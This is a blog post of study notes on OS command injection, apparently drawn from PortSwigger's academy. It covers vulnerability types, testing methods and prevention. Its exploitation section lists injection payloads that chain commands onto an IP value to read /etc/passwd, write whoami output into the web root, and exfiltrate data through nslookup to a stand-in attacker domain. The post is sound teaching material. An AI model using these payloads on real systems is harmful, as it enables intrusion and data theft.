---
layout: post
title:  "PortSwigger - Command Injection - Theory"
date:   2024-07-06 13:40
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [command-injection]
categories: [PortSwigger]
---

# Introduction
>OS Command Injection is a vulnerability that consists of an attacker executing commands on the host operating system via a vulnerable application.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://academy.ranakhalil.com/courses/1491236/lectures/38308201">Rana Khalil Academy - OS Command injection</a>
<br/>
<a href="https://portswigger.net/web-security/os-command-injection">PortSwigger - OS Command Injection</a>
<br/>
<a href="https://owasp.org/www-community/attacks/Command_Injection">OWASP - Command Injection</a>
<br/>
<a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP - OS Command Injection Defense Cheat Sheet</a>
<br/>

### Two conditions for OS Command Injection vulnerabilities:
<hr/>

1. Uses a function that can execute system commands such as exec.
1. The parameter of executable methods are user controllable.

![Code vulnerable to command injection](/images/portswigger/CommandInjection/VulnerableCommandInjectionCodeExample.png)

### Types of Command Injection
<hr/>

#### In-band Command Injection
Consists of an attacker executing commands on the host operating system via a vulnerable application and `receiving the response of the command in the application.`
<br/>

#### Blind Command Injection
Consists of an attacker executing commands on the host operating system via a vulnerable application `that does not return the output from the command within its HTTP response.`
<br/>

### Impact of Command Injection Attacks:
- Unauthorized access to the application:
    - `Confidentiality` - Command injection can be used to view sensitive information.
    - `Integrity` - Command Injection can be used to alter content in the application.
    - `Availability` - Command Injection can be used to delete content in the application.
- Remote code execution on the operating system.

![OWASP - Injection Ranking](/images/portswigger/CommandInjection/OWASP_Injection_Ranking)

### How to find Command Injection ?
<hr/>

#### Black-Box Testing
- Map the application
    - Identify all instances where the web application appears to be interacting with the underlying operating system. 
- Fuzz the application. 
    - Shell metacharacters: &, &&, |, ||, ;, \n, `, $(). 
- For in-band command injection, analyze the response of the application to determine if it’s vulnerable. 
- For blind command injection, you need to get creative. 
    - Trigger a time delay using the ping or sleep command. 
    - Output the response of the command in the web root and retrieve the file directly using a browser. 
    - Open an out-of-band channel back to a server you control.

#### White-Box Testing
- Perform a combination of black box and white-box testing. 
- Map all input vectors in the application. 
- Review source code to determine if any of the input vectors are added as parameters to functions that execute system commands. 
- Once a vulnerability is identified, test it to confirm that it is exploitable.

### How to exploit command injection ?
<hr/>

#### Exploiting In-band Command injection
- Shell metacharacters:
```
&
&& 
|
|| 
;
\n
`
$()
```
- Concatenate another command
```
127.0.0.1 && cat /etc/passwd &
127.0.0.1 & cat /etc/passwd &
127.0.0.1 || cat /etc/passwd &
```

#### Exploiting Blind Command Injection
- Shell metacharacters: 
```
&
&&
|
||
;
\n
`
$()
```
- Trigger a time delay
```
127.0.0.1 && sleep 10 &
127.0.0.1 && ping -c 10 127.0.0.1 &
```
- Output the response of the command in the web root and retrieve the file directly using a browser
```
127.0.0.1 & whoami > /var/www/static/whoami.txt #
```
- Open an out-of-band channel back to a server you control.
```
127.0.0.1 & nslookup kgji2ohoyw.web-attacker.com &
127.0.0.1 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

### How to prevent Command injection ?
<hr/>

#### Preventing Command Injection Vulnerabilities
The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. Instead, implement the required functionality using safer platform APIs.
- For example: use mkdir() instead of system("mkdir/dir_name")

It is required to perform OS commands using user-supplied input, then strong input validation must be performed. 
- Validate against a whitelist of permitted values. 
- Validate that the input is as expected or valid input.
<hr/>